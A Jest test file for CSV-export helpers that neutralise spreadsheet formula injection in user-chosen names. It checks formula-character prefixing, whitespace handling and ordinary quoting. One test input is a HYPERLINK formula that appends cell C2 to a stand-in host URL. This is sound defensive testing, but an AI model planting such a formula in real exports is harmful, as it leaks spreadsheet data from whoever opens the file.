import { csvCell, csvLine } from './screenshot-csv';

/**
 * F-08: a person chooses their own name, and it is written into the archive's
 * index.csv that a Super Admin opens in a spreadsheet. No cell may be read as a
 * formula, and ordinary text must come through untouched.
 */
describe('csvCell', () => {
  it('neutralises the formula a Staff member put in their own name', () => {
    expect(csvCell('=HYPERLINK("http://x.invalid/"&C2,"open")')).toBe(
      '"\'=HYPERLINK(""http://x.invalid/""&C2,""open"")"',
    );
  });

  it.each([
    ['=1+1', "'=1+1"],
    ['+1+1', "'+1+1"],
    ['-1+1', "'-1+1"],
    ['@SUM(A1)', "'@SUM(A1)"],
    ['\t=1+1', "'\t=1+1"],
    ['\tAsha', "'\tAsha"],
  ])('prefixes %j with a single quote', (value, expected) => {
    expect(csvCell(value)).toBe(expected);
  });

  it('prefixes and quotes a cell that starts with a carriage return', () => {
    expect(csvCell('\r=1+1')).toBe('"\'\r=1+1"');
    expect(csvCell('\rAsha')).toBe('"\'\rAsha"');
  });

  it.each([
    ['a space', ' =1+1'],
    ['several spaces', '   @SUM(A1)'],
    ['a no-break space', ' =1+1'],
    ['a no-break space and a space', '  +1'],
    ['a space and a tab', ' \t-1'],
    ['a line feed', '\n=1+1'],
  ])('looks past %s before the first character', (_what, value) => {
    const cell = csvCell(value);
    const text = cell.startsWith('"') ? cell.slice(1, -1) : cell;
    expect(text).toBe(`'${value}`);
  });

  it.each([
    'Asha Rao',
    'Engineering',
    'asha.rao@rxv.test',
    "O'Brien",
    'Anne-Marie',
    'R+D',
    'a=b',
    'user@rxv.test',
    ' Asha',
    '2026-11-19',
    '12',
    '0',
    '',
    'No department',
    'Engineering/Asha Rao/2026-11-19 Thu.pdf',
  ])('leaves %j as it is', (value) => {
    expect(csvCell(value)).toBe(value);
  });

  it('keeps the ordinary CSV quoting', () => {
    expect(csvCell('Rao, Asha')).toBe('"Rao, Asha"');
    expect(csvCell('Asha "AR" Rao')).toBe('"Asha ""AR"" Rao"');
    expect(csvCell('line one\nline two')).toBe('"line one\nline two"');
    expect(csvCell('line one\rline two')).toBe('"line one\rline two"');
  });

  it('only looks at the start of the value', () => {
    // A formula character further in is ordinary text, and the cell is quoted as usual.
    expect(csvCell('Rao, =Asha')).toBe('"Rao, =Asha"');
  });
});

describe('csvLine', () => {
  it('passes every cell through csvCell and joins with commas', () => {
    expect(csvLine(['Engineering', '=1+1', 'a,b', '2026-11-19', '3'])).toBe(
      'Engineering,\'=1+1,"a,b",2026-11-19,3',
    );
  });

  it('writes the plain header as it was', () => {
    expect(
      csvLine(['department', 'employee', 'email', 'date', 'screenshots', 'unreadable', 'file']),
    ).toBe('department,employee,email,date,screenshots,unreadable,file');
  });
});
